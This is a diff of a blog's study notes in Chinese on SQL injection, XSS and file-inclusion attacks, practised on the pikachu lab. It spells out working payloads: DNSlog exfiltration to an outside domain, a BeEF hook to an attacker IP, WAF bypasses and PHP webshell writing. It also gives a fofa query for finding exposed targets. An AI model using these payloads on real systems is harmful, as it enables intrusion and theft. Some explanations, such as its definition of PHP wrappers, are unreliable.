-c. 逐字符猜解表名
-?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=库名 limit 偏移量,1),第几位,1))&lt;ASCII值	//先判断范围?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=库名 limit 偏移量,1),第几位,1))&gt;ASCII值	?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=库名 limit 偏移量,1),第几位,1))=ASCII值	//再确定字符?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 偏移量,1),第几位,1))=ASCII值// 直接填爆出来的库名或者database()都可以
-
-示例（表名：users，以第一个字符 u 为例）：
-?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;100?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;120?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=117	//true 117对应u 说明表名中有一个字母是u
-
-
-猜解表内字段
-
-a.  判断字段总数
-?id=1 and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;表名&#x27;)=数值
-
-更改数值，挨个测试，表名填自己想查询的表名。
-示例（假如 users 表里面有两个字段分别是 username 和  password）：
-?id=1 and (select count(column_name) from information_schema.columns where table_schema=data and table_name=&#x27;users&#x27;)=2
-
-b. 判断字段名长度
-?id=1 and length((select column_name from information_schema.columns where table_schema=库名 and table_name=表名 limit 偏移量,1))=长度
-
-示例（查第一个字段名的长度）：
-?id=1 and length((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1))&lt;10?id=1 and length((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1))&lt;1?id=1 and length((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1))=8 // 第一个字段的长度是8个字符
-
-c. 逐字符猜字段名
-?id=1 and ascii(substr((select column_name from information_schema.columns where table_schema=库名 and table_name=表名 limit 偏移量,1),第几位,1))=ASCII值
-
-示例（以 username 为例，查第一个字符 u）：
-?id=1 and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))&lt;100?id=1 and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))&lt;110?id=1 and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))=117
-
-
-猜解表中数据
-
-a. 判断数据长度
-?id=1 and (select LENGTH(字段名) from 表名 limit 0,1)=长度
-
-示例：假设获得username 字段第一行数据的内容长度为 2
-?id=1 and (select LENGTH(username) from users LIMIT 0,1)=5
-
-b. 逐字符猜数据内容
-?id=1 and ascii(substr((select 字段名 from 表名 limit 偏移量,1),第几位,1))=ASCII值
-
-示例：假设获得user字段第一行数据第一个字符内容
-?id=1 and ascii(substr((select name from users limit 0,1),1,1))=97?id=1 and ascii(substr((select name from users limit 0,1),2,1))=100
-
-2.4 延迟盲注2.4.1 概念也称延时注入、时间注入等，这种注入方式在传给后台的参数中，设置了一个if语句，当条件为真时执行sleep语句，条件为假时无执行语句，然后根据浏览器的响应时间来推测sleep语句是否被执行，进而推测if条件是否为真。延时盲注与布尔盲注的核心思想都是通过浏览器两种不同的响应来推测输入的条件的真假，布尔盲注是条件真假时页面会有不同显示，延时盲注则是显示结果真假只能从响应时间上进行推测。
-2.4.2 使用条件union、报错、布尔等搞不定的时候才考虑，效率极低。
-2.4.3 注入步骤示例参数：库名 data、表名 users、字段 name、password
-
-测试延时注入点
-
-?id=1 and sleep(秒数)
-
-示例：
-?id=1 and sleep(5)
-
-
-猜数据库名
-
-a. 判断库名长度
-?id=1 and if(length(database())=数值,sleep(5),1)
-
-示例：
-?id=1 and if(length(database())=4,sleep(5),1)
-
-b. 逐字符猜库名
-?id=1 and if(ascii(substr(database()),位数,1)=ASCII值,sleep(5),1)
-
-示例：
-?id=1 and if(ascii(substr(database(),1,1))=100,sleep(5),1)?id=1 and if(ascii(substr(database(),2,1))=97,sleep(5),1)
-
-
-猜数据表名
-
-a. 判断表名长度
-?id=1 and if(length((select table_name from information_schema.tables where table_schema=库名 limit 序号,1))=数值,sleep(5),1)
-
-示例（库名为 data，长度为 4）：
-?id=1 and if(length((select table_name from information_schema.tables where table_schema=data limit 0,1))=4,sleep(5),1)
-
-b. 逐字符猜表名
-?id=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=库名 limit 序号,1),位数,1))=ASCII值,sleep(5),1)
-
-示例：
-?id=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=data limit 0,1),1,1))=117,sleep(5),1)
-
-
-猜字段名
-
-a. 判断字段名长度
-?id=1 and if(length((select column_name from information_schema.columns where table_schema=库名 and table_name=表名 limit 序号,1))=数值,sleep(5),1)
-
-示例
-?id=1 and if(length((select column_name from information_schema.columns where table_schema=data and table_name=&#x27;users&#x27; limit 0,1))=4,sleep(5),1)
-
-b. 逐字符猜字段
-?id=1 and if(ascii(substr((select column_name from information_schema.columns where table_schema=库名 and table_name=表名 limit 序号,1),位数,1))=ASCII值,sleep(5),1)
-
-示例：
-?id=1 and if(ascii(substr((select column_name from information_schema.columns where table_schema=data and table_name=&#x27;users&#x27; limit 0,1),1,1))=110,sleep(5),1)
-
-
-猜表内数据
-
-?id=1 and if(ascii(substr((select 字段名 from 表名 limit 序号,1),位数,1))=ASCII值,sleep(5),1)
-
-示例：
-?id=1 and if(ascii(substr((select name from users limit 0,1),1,1))=97,sleep(5),1)
-
-注解
-
-序号：表 &#x2F; 字段排序，从 0 开始计数
-位数：字符串截取位置
-sleep (5)：条件成立延迟 5 秒响应
-
-2.5 DNSlog 盲注2.5.1 概念DNSlog盲注就是通过load_file函数发起请求，然后去DNSlog平台接收数据，需要用到load_file函数，就是需要用到root用户读写文件的功能。
-2.5.2 查看配置show VARIABLES like &#x27;secure_file_priv&#x27;
-
-
-secure_file_priv&#x3D;null 不允许导入导出
-secure_file_priv&#x3D;tmp&#x2F; 只能在tmp目录
-secure_file_priv&#x3D; 无限制
-
-2.5.3 有权限直接读取
-读取路径：
-
-?id=-1 union select 1,2,3,@@datadir
-
-
-读取文件：
-
-?id=-1 union select 1,2,3,load_file(&#x27;文件完整路径&#x27;)
-
-示例：（\ 转义）
-?id=-1 union select 1,2,3,load_file(&#x27;C:\\phpStudy\\WWW\\config.php&#x27;)
-
-
-写入文件：
-
-?id=-1 union select 1,2,3,&#x27;写入内容&#x27; into outfile &#x27;文件保存路径&#x27;
-
-示例：
-?id=-1 union select 1,2,3,&#x27;&lt;?php phpinfo();?&gt;&#x27; into outfile &#x27;C:\\phpStudy\\WWW\\shell.php&#x27;?id=-1 union select 1,2,3,&#x27;&lt;?php phpinfo();?&gt;&#x27; into outfile &#x27;C:/phpStudy/WWW/shell.php&#x27;
-
-2.5.4 采用 DNSlog 带外获取http://dnslog.cn/  
-
-
-实操：点击 Get SubDomain 获取域名 xgikzx.dnslog.cn  
-
-
-
-查当前库名
-
-?id=1 and load_file(concat(&#x27;//&#x27;,(select database()),&#x27;.获取的域名/123&#x27;))
-
-注入后，点击网站的 Refresh Record 就会返回数据库名。
-
-查表名
-
-// 获取第一张表?id=1 and load_file(concat(&#x27;//&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&#x27;.获取的域名/123&#x27;))// 获取第二张表?id=1 and load_file(concat(&#x27;//&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 1,1),&#x27;.获取的域名/123&#x27;))
-
-2.6 二次注入2.6.1 概念二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。
-2.6.2 实战
-碰撞用户，确认用户名 admin 存在
-注册用户名：admin&#39;#
-修改密码时执行SQL：
-
-update users set password=md5(&#x27;123456&#x27;) where name=&#x27;admin&#x27;#&#x27;
-
-admin&#39;#的密码没变，修改的是admin的密码
-2.7 堆叠注入2.7.1 概念在SQL数据库中，每条语句是以;分开的，堆叠注入就是一次性注入并执行多条语句（多语句之间以分号隔开）的注入方式。与 union 对比：union 联合查询注入执行的语句是有限的，可以用来执行查询语句。堆叠注入可以执行任意语句，比如增删改查。
-2.7.2 实战
-获取库名、表名、字段名、数据等信息
-构造攻击语句：
-
-?id=2;insert into users (name,password) values(&#x27;admin&#x27;,md5(&#x27;admin&#x27;));
-
-
-3. SQLMap工具运用
-官⽹：https://sqlmap.org/
-作⽤： sqlmap是⼀个开源的渗透测试⼯具，它可以⾃动化检测和利⽤SQL注⼊漏洞并接管数据库服务器。它有⼀个强⼤的检测引擎，许多适合于终极渗透测试的良好特性和众多的操作选项。注意：kali⾃带
-
-3.1 常用命令//检测漏洞sqlmap -u &#x27;http://xxx?id=2&#x27;//查询当前数据库sqlmap -u &#x27;url&#x27; --current-db//查当前库有哪些表名sqlmap -u &#x27;url&#x27; -D 库名 --tables//某表有哪些字段sqlmap -u &#x27;url&#x27; -D 库名 -T 表名 --columns//列出数据sqlmap -u &#x27;url&#x27; -D 库名 -T 表名 -C 字段 --dump//其他：//执行sqlsqlmap -u &#x27;url&#x27; --sql-shell//执行系统命令sqlmap -u &#x27;url&#x27; --os-shell//读取文件sqlmap -u &#x27;url&#x27; --file-read &quot;d:/e.txt&quot;
-
-3.2 绕过WAFsqlmap -u &#x27;url&#x27; --tamper=passdog.py
-
-
-4. SQL注入绕过4.1 提交方式更改GET 改 POST
-安全狗（WAF 防御）
-4.2 特殊字符绕过database/**/()
-
-4.3 参数污染?id=1/**&amp;id=-1 union select 1,2,3,4%23*/
-
-4.4 数据库特性绕过/*!44509select*/
-
-
-5. SQL注入防护
-过滤：限制长度、识别恶意关键字
-转义：用户输入当文本
-数据库权限控制、敏感数据加密
-预编译（参数化查询）
-
-
-6. 总结
-报错注入是在 union 注入在查询不到的情况下，才使用
-在使用报错注入的时候要关注报错注入的函数extractvalue()、updatexml()
-
-
-本文为个人学习笔记，如有错误或疏漏，欢迎批评指正。
-
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>SQL</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>XSS漏洞</title>
-    <url>/2026/06/08/XSS%E6%BC%8F%E6%B4%9E/index/</url>
-    <content><![CDATA[一、XSS简介与危害（1）定义跨站脚本攻击XSS（Cross Site Scripting），为避免与层叠样式表（CSS）缩写混淆，故缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。
-（2）危害
-盗取各类用户账号，如机器登录帐号、用户网银帐号、各类管理员帐号
-控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力
-盗窃企业重要的具有商业价值的资料
-非法转账
-强制发送电子邮件
-网站挂马
-控制受害者机器向其它网站发起攻击（重定向语句）
-窃取cookie的sessionid，冒充登录
-
-
-二、反射型与存储型XSSXSS攻击可分为三类：反射型、存储型、DOM型，易混淆的是反射和DOM类型。
-1. 反射型（1）反射型流程
-黑客诱导用户点击恶意URL：xxxxxxx.com/?xxx=&lt;script&gt;恶意代码&lt;/script&gt;
-客户端向URL对应的服务器发出请求
-服务器将恶意代码从URL中取出，拼接在HTML中返回给浏览器
-客户端解析代码，恶意代码随之执行
-
-
-
-（2）案例
-编写代码
-
-把 php 文件放在 phpstudy 的 www 目录下
-&lt;?php$xss = $_GET[&#x27;x&#x27;];echo $xss;?&gt;
-
-访问
-?x=1?x=&lt;script&gt;alert(1)&lt;/script&gt;?x=&lt;script&gt;alert(&#x27;已入侵你后端系统&#x27;)&lt;/script&gt;?x=&lt;h1 style=&#x27;font-size: 10vw;&#x27;&gt;你已被入侵啦,遭到破坏！&lt;/script&gt;&lt;/h1&gt;
-
-
-fofa搜索命令
-
-&quot;pikachu&quot; &amp;&amp; country=&quot;CN&quot; &amp;&amp; title=&quot;Get the pikachu&quot;
-
-
-
-
-
-进入 pikachu 靶场
-如果 fofa 访问失败，可以自己搭建pikachu靶场**。**
-pikachu靶场：反射型XSS 练习
-
-反射型xss
-
-
-
-先输入 1 测试
-
-
-输入恶意代码
-&lt;script&gt;alert(1)&lt;/script&gt;
-
-方法一：
-直接在 URL 中修改 message 的值。因为根据测试结果来看，我们输入的 1 实际上是 message 的值。
-
-
-
-
-方法二：
-直接在输入框里输入恶意代码，但是我们发现会有长度限制：
-
-
-F12，发现可以输入的最大长度是 20，那我们就可以把它的数值改大一点。
-
-
-
-
-注意：改完之后不要刷新，不然又会恢复 20。
-
-
-总结：输入框长度限制可通过修改URL或F12改前端代码绕过
-2. 存储型攻击数据存储在服务器，攻击持续生效，危害比反射型更大。
-以 pikachu 靶场为例：
-
-
-传入一个恶意代码
-&lt;h1 style=&#x27;font-size: 10vw;&#x27;&gt;你已被入侵啦,遭到破坏！&lt;/script&gt;&lt;/h1&gt;
-
-
-
-只要刷新这个页面，就会重复出现这句话。
-3. DOM型（1）流程
-黑客诱导用户点击恶意URL
-
-#&#x27; onclick=&quot;alert(1)&quot;
-
-
-客户端直接执行攻击代码，无需与服务器交互
-攻击纯粹发生在客户端
-
-
-
-以 pikachu 靶场为例：
-
-
-先输入 1 测试一下
-
-
-传入一个恶意代码：
-#&#x27; onclick=&quot;alert(1)&quot;
-
-
-
-点击之后：
-
-
-4. BeEF-XSS工具使用具体使用：beef-xss详细教程-CSDN博客
-BeEF是Kali自带的XSS利用工具，基于Ruby开发。
-
-
-（1）核心信息
-Web UI：http://127.0.0.1:3000/ui/panel
-Hook代码：&lt;script src=&quot;http://&lt;IP&gt;:3000/hook.js&quot;&gt;&lt;/script&gt;
-
-（2）攻击流程
-黑客（Kali）IP 放入 Hook 代码中
-
-&lt;script src=&quot;http://192.168.23.131:3000/hook.js&quot;&gt;&lt;/script&gt;
-
-
-注入Hook代码到表单提交入库
-
-
-
-
-
-
-受害者访问页面被Hook，BeEF控制台可控制浏览器（如重定向）
-
-
-三、XSS的绕过技巧与修复1. 未开启WAF直接URL注入：
-http://localhost/1.php?x=%3Cscript%3Ealert(1)%3C/script%3E
-
-2. 开启WAF（安全狗）请求被拦截，提示“带有不合法参数”。
-3. 手工绕过（1）标签语法替换
-audio标签
-
-&lt;audio src=x onerror=alert(47)&gt;&lt;audio src=x onerror=prompt(1);&gt;&lt;audio src=1 href=1 onerror=javascript:alert(1)&gt;
-
-
-video标签
-
-&lt;video src=x onerror=prompt(1);&gt;&lt;video src=x onerror=alert(48)&gt;
-
-
-button标签
-
-&lt;button onfocus=alert(1) autofocus&gt;&lt;button/onclick=alert(1)&gt;xss&lt;/button&gt;
-
-（2）加密算法&lt;details open ontoggle=eval(String.fromCharCode(97,108,101,114,116,40,49,41))&gt;# 97,108,101,114,116,40,49,41 = alert(1)
-
-4. XSStrike工具可识别并绕过WAF的XSS扫描工具，项目地址：https://github.com/s0md3v/XSStrike
-（1）常用参数XSStrike
--h, --help显示帮助信息
--u, --url指定目标 URL
---dataPOST 方式提交内容
--v, --verbose详细输出
--f, --file加载自定义 payload 字典
--t, --threads定义线程数
--l, --level爬行深度
--t, --encode定义 payload 编码方式
---json将 POST 数据视为 JSON
---path测试 URL 路径组件
---seeds从文件中测试、抓取 URL
---fuzzer测试过滤器和 Web 应用程序防火墙（WAF）
---update更新工具
---timeout设置超时时间
---params指定参数
---crawl爬行目标网站
---proxy使用代理
---blind盲测试
---skip跳过确认提示
---skip-dom跳过 DOM 扫描
---headers提供 HTTP 标头
--d, --delay设置请求延迟
-
-（2）使用示例# 安装依赖pip install -r requirements.txt -i https://mirrors.aliyun.com/pypi/simple/# Fuzz测试python xsstrike.py -u &quot;http://localhost/1.php?x=1&quot; --fuzzer# 直接探测python xsstrike.py -u &quot;http://localhost/1.php?x=1&quot;
-
-（3）优化测试页面&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;&lt;title&gt;欢迎来到&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;欢迎&lt;/h1&gt;&lt;?php$xss = $_GET[&#x27;x&#x27;];echo $xss;?&gt;&lt;center&gt;测试XSS&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;
-
-
-四、总结Q1：XSS 是什么？跨站脚本攻击
-Q2：XSS的产生原因是什么？后端开发没有对用户传入的参数做严格的限制或过滤，直接输出了用户传入的参数，导致用户传入的参数被浏览器当作 javascript 执行。
-Q3：XSS有什么危害？1、获取浏览器的其他信息
-2、窃取浏览器的敏感信息
-3、劫持浏览器（用  BeEF ，了解常用功能，比如：重定向redirect、）
-Q4：怎么修复 XSS漏洞？过滤常见关键字
-Q5：怎么绕 WAF？挨个使用 audio、script、video、button标签、加密算法，最后使用产生随机码。
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>XSS</category>
-      </categories>
-      <tags>
-        <tag>XSS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件包含漏洞</title>
-    <url>/2026/06/08/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/index/</url>
-    <content><![CDATA[一、漏洞检测与危害1.概念
-文件包含：开发中用于复用代码；
-漏洞成因：可控参数未过滤，可引入外部文件当做PHP代码执行。
-危害：执行恶意图片木马、读取网站配置等敏感文件，造成源码泄露、服务器被控。
-
-2.漏洞检测
-白盒：代码审计查看include&#x2F;include_once&#x2F;require&#x2F;require_once参数是否可控
-黑盒：手工观察URL文件参数、漏洞扫描工具、公开POC测试
-
-
-二、本地包含 &amp; 远程文件包含1. 本地文件包含（LFI）仅读取服务器本地已有文件，常搭配文件上传使用
-(1) 无后缀拼接限制服务端代码1.php
-&lt;?php$filename=$_GET[&#x27;filename&#x27;];include ( $filename);?&gt;
-
-新建1.txt：&lt;?php phpinfo(); ?&gt;访问:http://localhost/include/upload.php?filename=1.txt
-
-txt文件被PHP解析执行。
-
-(2)服务端自动拼接后缀.html（upload2.php）&lt;?php$filename=$_GET[&#x27;filename&#x27;];include($filename.&quot;.html&quot;);?&gt;
-
-直接传1.txt会拼接成1.txt.html报错，两种绕过：
-①%00截断（PHP&lt;5.3，magic_quotes_gpc关闭)
-
-原理：%00终止字符串，.html被舍弃。
-访问：http://localhost/include/upload2.php?filename=1.txt%00
-
-②超长路径截断
-原理：Windows文件名上限255字符、Linux4096字符，大量.填充耗尽路径，末尾.html被丢弃.
-?filename=1.txt......................................................................
-
-(3) 远程文件包含(RFI)
-可加载外网文件，危害更大
-前提：php.ini中allow_url_include = On
-
-①无限制远程包含本地：?filename=http://192.168.0.13:88/1.txt远程1.txt内容&lt;?php phpinfo(); ?&gt;，远程代码被本地服务器执行。
-②服务拼接后缀.html绕过代码：include($filename.&quot;.html&quot;);
-
-方式1：?filename=http://192.168.0.13:88/1.txt?问号作为URL参数，.html变成无效参数被忽略
-方式2：?filename=http://192.168.0.13:88/1.txt%23%23是#，注释掉后面拼接的.html (%00 截断也可以）
-
-
-三、PHP常用伪协议PHP伪协议(PHP Protocol Override)是一种在PHP处理数据时，通过替换数据报的头部信息来欺骗网络协议的方式来提高性能的技术。
-
-
-
-协议
-PHP版本
-allow_url_fopen
-allow_url_include
-使用示例
-
-
-
-file:&#x2F;&#x2F;
-≥5.2
-off&#x2F;on
-off&#x2F;on
-?file&#x3D;file:&#x2F;&#x2F;D&#x2F;soft&#x2F;phpStudy&#x2F;WWW&#x2F;phpcode.txt
-
-
-php:&#x2F;&#x2F;filter
-≥5.2
-off&#x2F;on
-off&#x2F;on
-?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.index.php
-
-
-php:&#x2F;&#x2F;input
-≥5.2
-off&#x2F;on
-on
-GET传参，POST写入PHP代码
-
-
-zip:&#x2F;&#x2F;
-≥5.2
-off&#x2F;on
-off&#x2F;on
-?file&#x3D;zip:&#x2F;&#x2F;D&#x2F;xxx.zip&#x2F;23phpcode.txt
-
-
-compress.bzip2:&#x2F;&#x2F;
-≥5.2
-off&#x2F;on
-off&#x2F;on
-?file&#x3D;compress.bzip2:&#x2F;&#x2F;xxx.bz2
-
-
-compress.zlib:&#x2F;&#x2F;
-≥5.2
-off&#x2F;on
-off&#x2F;on
-?file&#x3D;compress.zlib:&#x2F;&#x2F;xxx.gz
-
-
-data:&#x2F;&#x2F;
-≥5.2
-on
-on
-?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,
-
-
-1、http&#x2F;https协议远程包含常规协议。
-(高亮的部分是伪协议）
-http://localhost/include/upload.php?filename=http://192.168.0.13:88/1.txt
-
-2、php:&#x2F;&#x2F;filter（读取源码，最常用）
-作用：读取目标文件并编码输出，避免源码直接被浏览器解析。
-常用过滤器：convert.base64-encode
-示例 payload：http://localhost/include/upload.php?filename=php://filter/read=convert.base64-encode/resource=upload.php拿到base64字符串后解码得到源代码。
-附加过滤器分类：
-字符串：string.rot13、string.toupper、string.tolower、string.strip_tags
-转换：convert.base64系列、quoted-printable
-压缩：bzip2、zlib
-加密：mdecrypt系列
-
-
-
-3、php:&#x2F;&#x2F;input（POST传入代码执行）
-原理：读取POST原始数据当做PHP代码执行
-示例：
-执行系统命令verGET：?filename=php://inputPOST数据：&lt;?php system(&#39;ver&#39;);?&gt;
-写入一句话木马shell.phpGET：?filename=php://inputPOST：&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd]); ?&gt;&#39;); ?&gt;访问shell.php，POST cmd=phpinfo();即可连接蚁剑。
-
-
-
-4、file:&#x2F;&#x2F;协议（读取本地绝对路径文件）
-示例：
-读取hosts：?filename=file:///C:\Windows\System32\drivers\etc\hosts
-
-
-
-5、data:&#x2F;&#x2F;协议（内嵌PHP代码执行）两种写法：
-?filename=data://text/plain,&lt;?php phpinfo();?&gt;?filename=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
-
-
-四、不安全文件下载漏洞1. 原理
-本质：受信越界，这是一种输入验证不严格导致的越界访问漏洞。正常情况下，应用只允许用户下载特定的目录（如&#x2F;uploads）下的公开资源，但由于程序直接信任了用户输入的路径或文件名，导致攻击者可以通过构造特殊的字符，跳出原本设定的储存边界，访问并下载服务器上任意可读的文件。
-核心机制：漏洞实现完全依赖于路径穿越（或目录跳转）。在操作系统中，..&#x2F;(Unix&#x2F;Linux)或..(Windows)代表返回上一级目录。当应用吧用户输入的参数直接拼接到服务器的文件查找路径中时，攻击者利用连续的..&#x2F;..&#x2F;..&#x2F;..&#x2F;,就可以一层一层脱离网站根目录，最终定位到系统的核心敏感文件。
-
-2. Pikachu靶场实操
-下载链接原地址：http://xxx/vul/unsafedownload/execdownload.php?filename=smallane.png
-利用目录穿越payload：http://xxx/vul/execdownload.php?filename=../../../inc/config.inc.php直接下载网站数据库配置等敏感源码。
-
-
-五、补充文件下载与文件包含原理相近：
-
-文件包含：文件被PHP引擎执行
-文件下载：文件直接二进制输出下载到本地
-
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>文件包含</category>
-      </categories>
-      <tags>
-        <tag>文件包含</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>逻辑漏洞</title>
     <url>/2026/06/14/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/index/</url>
     <content><![CDATA[一、逻辑漏洞的概念1、逻辑漏洞的定义逻辑漏洞是指在软件或系统的设计和实现中，由于逻辑错误或缺陷导致的安全问题。这些漏洞不是由于代码编写的错误引起的，而是由于系统设计时的逻辑思路有问题，导致系统在某些情况下无法正常处理，进而被攻击者利用。
@@ -2016,6 +2884,168 @@ ID、随机数生成规则简单，可枚举&#x2F;预测
       </tags>
   </entry>
   <entry>
+    <title>文件包含漏洞</title>
+    <url>/2026/06/08/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/index/</url>
+    <content><![CDATA[一、漏洞检测与危害1.概念
+文件包含：开发中用于复用代码；
+漏洞成因：可控参数未过滤，可引入外部文件当做PHP代码执行。
+危害：执行恶意图片木马、读取网站配置等敏感文件，造成源码泄露、服务器被控。
+
+2.漏洞检测
+白盒：代码审计查看include&#x2F;include_once&#x2F;require&#x2F;require_once参数是否可控
+黑盒：手工观察URL文件参数、漏洞扫描工具、公开POC测试
+
+
+二、本地包含 &amp; 远程文件包含1. 本地文件包含（LFI）仅读取服务器本地已有文件，常搭配文件上传使用
+(1) 无后缀拼接限制服务端代码1.php
+&lt;?php$filename=$_GET[&#x27;filename&#x27;];include ( $filename);?&gt;
+
+新建1.txt：&lt;?php phpinfo(); ?&gt;访问:http://localhost/include/upload.php?filename=1.txt
+
+txt文件被PHP解析执行。
+
+(2)服务端自动拼接后缀.html（upload2.php）&lt;?php$filename=$_GET[&#x27;filename&#x27;];include($filename.&quot;.html&quot;);?&gt;
+
+直接传1.txt会拼接成1.txt.html报错，两种绕过：
+①%00截断（PHP&lt;5.3，magic_quotes_gpc关闭)
+
+原理：%00终止字符串，.html被舍弃。
+访问：http://localhost/include/upload2.php?filename=1.txt%00
+
+②超长路径截断
+原理：Windows文件名上限255字符、Linux4096字符，大量.填充耗尽路径，末尾.html被丢弃.
+?filename=1.txt......................................................................
+
+(3) 远程文件包含(RFI)
+可加载外网文件，危害更大
+前提：php.ini中allow_url_include = On
+
+①无限制远程包含本地：?filename=http://192.168.0.13:88/1.txt远程1.txt内容&lt;?php phpinfo(); ?&gt;，远程代码被本地服务器执行。
+②服务拼接后缀.html绕过代码：include($filename.&quot;.html&quot;);
+
+方式1：?filename=http://192.168.0.13:88/1.txt?问号作为URL参数，.html变成无效参数被忽略
+方式2：?filename=http://192.168.0.13:88/1.txt%23%23是#，注释掉后面拼接的.html (%00 截断也可以）
+
+
+三、PHP常用伪协议PHP伪协议(PHP Protocol Override)是一种在PHP处理数据时，通过替换数据报的头部信息来欺骗网络协议的方式来提高性能的技术。
+
+
+
+协议
+PHP版本
+allow_url_fopen
+allow_url_include
+使用示例
+
+
+
+file:&#x2F;&#x2F;
+≥5.2
+off&#x2F;on
+off&#x2F;on
+?file&#x3D;file:&#x2F;&#x2F;D&#x2F;soft&#x2F;phpStudy&#x2F;WWW&#x2F;phpcode.txt
+
+
+php:&#x2F;&#x2F;filter
+≥5.2
+off&#x2F;on
+off&#x2F;on
+?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.index.php
+
+
+php:&#x2F;&#x2F;input
+≥5.2
+off&#x2F;on
+on
+GET传参，POST写入PHP代码
+
+
+zip:&#x2F;&#x2F;
+≥5.2
+off&#x2F;on
+off&#x2F;on
+?file&#x3D;zip:&#x2F;&#x2F;D&#x2F;xxx.zip&#x2F;23phpcode.txt
+
+
+compress.bzip2:&#x2F;&#x2F;
+≥5.2
+off&#x2F;on
+off&#x2F;on
+?file&#x3D;compress.bzip2:&#x2F;&#x2F;xxx.bz2
+
+
+compress.zlib:&#x2F;&#x2F;
+≥5.2
+off&#x2F;on
+off&#x2F;on
+?file&#x3D;compress.zlib:&#x2F;&#x2F;xxx.gz
+
+
+data:&#x2F;&#x2F;
+≥5.2
+on
+on
+?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,
+
+
+1、http&#x2F;https协议远程包含常规协议。
+(高亮的部分是伪协议）
+http://localhost/include/upload.php?filename=http://192.168.0.13:88/1.txt
+
+2、php:&#x2F;&#x2F;filter（读取源码，最常用）
+作用：读取目标文件并编码输出，避免源码直接被浏览器解析。
+常用过滤器：convert.base64-encode
+示例 payload：http://localhost/include/upload.php?filename=php://filter/read=convert.base64-encode/resource=upload.php拿到base64字符串后解码得到源代码。
+附加过滤器分类：
+字符串：string.rot13、string.toupper、string.tolower、string.strip_tags
+转换：convert.base64系列、quoted-printable
+压缩：bzip2、zlib
+加密：mdecrypt系列
+
+
+
+3、php:&#x2F;&#x2F;input（POST传入代码执行）
+原理：读取POST原始数据当做PHP代码执行
+示例：
+执行系统命令verGET：?filename=php://inputPOST数据：&lt;?php system(&#39;ver&#39;);?&gt;
+写入一句话木马shell.phpGET：?filename=php://inputPOST：&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd]); ?&gt;&#39;); ?&gt;访问shell.php，POST cmd=phpinfo();即可连接蚁剑。
+
+
+
+4、file:&#x2F;&#x2F;协议（读取本地绝对路径文件）
+示例：
+读取hosts：?filename=file:///C:\Windows\System32\drivers\etc\hosts
+
+
+
+5、data:&#x2F;&#x2F;协议（内嵌PHP代码执行）两种写法：
+?filename=data://text/plain,&lt;?php phpinfo();?&gt;?filename=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
+
+
+四、不安全文件下载漏洞1. 原理
+本质：受信越界，这是一种输入验证不严格导致的越界访问漏洞。正常情况下，应用只允许用户下载特定的目录（如&#x2F;uploads）下的公开资源，但由于程序直接信任了用户输入的路径或文件名，导致攻击者可以通过构造特殊的字符，跳出原本设定的储存边界，访问并下载服务器上任意可读的文件。
+核心机制：漏洞实现完全依赖于路径穿越（或目录跳转）。在操作系统中，..&#x2F;(Unix&#x2F;Linux)或..(Windows)代表返回上一级目录。当应用吧用户输入的参数直接拼接到服务器的文件查找路径中时，攻击者利用连续的..&#x2F;..&#x2F;..&#x2F;..&#x2F;,就可以一层一层脱离网站根目录，最终定位到系统的核心敏感文件。
+
+2. Pikachu靶场实操
+下载链接原地址：http://xxx/vul/unsafedownload/execdownload.php?filename=smallane.png
+利用目录穿越payload：http://xxx/vul/execdownload.php?filename=../../../inc/config.inc.php直接下载网站数据库配置等敏感源码。
+
+
+五、补充文件下载与文件包含原理相近：
+
